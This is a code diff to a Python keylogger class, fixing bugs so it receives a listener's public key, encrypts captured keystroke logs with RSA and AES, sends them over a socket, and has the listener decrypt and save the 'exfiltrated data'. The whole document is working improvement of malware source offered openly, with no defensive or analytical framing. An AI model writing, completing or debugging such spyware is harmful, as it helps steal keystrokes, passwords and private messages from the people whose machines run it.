@@ -51,6 +51,13 @@ class Keylogger:
         # TODO listener will reply with the public key, need to make logic to save it
         self.socket.send("REQ_PUB".encode())
 
+        buf = b""
+        while True:
+            data = self.socket.recv(4096)
+            if data:
+                buf += data
+                self.public_key = buf.decode()
+                break
 
     # Send log over the network
     def send_log(self):
@@ -63,7 +70,7 @@ class Keylogger:
             # If there is keystrokes to send, send them :^)
             if self.log:
                 payload = f"\n--- New Log Instance @ {self.time} ---\n{self.log}\n--- End Of Log Instance @ {self.end_time} ---\n"
-                self.socket.send(self.encrypt(payload).encode())
+                self.socket.send(self.encrypt(payload))
 
         self.log = ""
 
@@ -81,9 +88,9 @@ class Keylogger:
         self.private_key = new_key.exportKey()
         self.public_key = new_key.publickey().exportKey()
 
-    def get_rsa_cipher(key):
+    def get_rsa_cipher(self, key):
         rsakey = RSA.importKey(key)
-        return (PKCS1_OAEP.new(rsakey), rsakey.size_in_byes())
+        return (PKCS1_OAEP.new(rsakey), rsakey.size_in_bytes())
 
     def encrypt(self, plaintext):
         compressed_text = zlib.compress(plaintext.encode())
@@ -102,10 +109,11 @@ class Keylogger:
 
     def decrypt(self, encrypted):
         encrypted_bytes = BytesIO(base64.decodebytes(encrypted))
-        cipher_rsa, keysize_in_bytes = get_rsa_cipher(self.private_key)
+        cipher_rsa, keysize_in_bytes = self.get_rsa_cipher(self.private_key)
 
         encrypted_session_key = encrypted_bytes.read(keysize_in_bytes)
         nonce = encrypted_bytes.read(16)
+        tag = encrypted_bytes.read(16)
         ciphertext = encrypted_bytes.read()
 
         session_key = cipher_rsa.decrypt(encrypted_session_key)
@@ -113,7 +121,7 @@ class Keylogger:
         decrypted = cipher_aes.decrypt_and_verify(ciphertext, tag)
 
         plaintext = zlib.decompress(decrypted)
-        return plaintext
+        return str(plaintext)
 
     # For the listener - handle a received a conncetion
     def handle(self, client_socket):
@@ -134,7 +142,7 @@ class Keylogger:
                 buf=b""
             else:
                 with open(self.args.outfile, "w") as f:
-                    f.write(buf.decode())
+                    f.write(self.decrypt(buf))
                     print(f"[+] Wrote data to {self.args.outfile}")
 
     # Create the listener to receive exfiltrated data
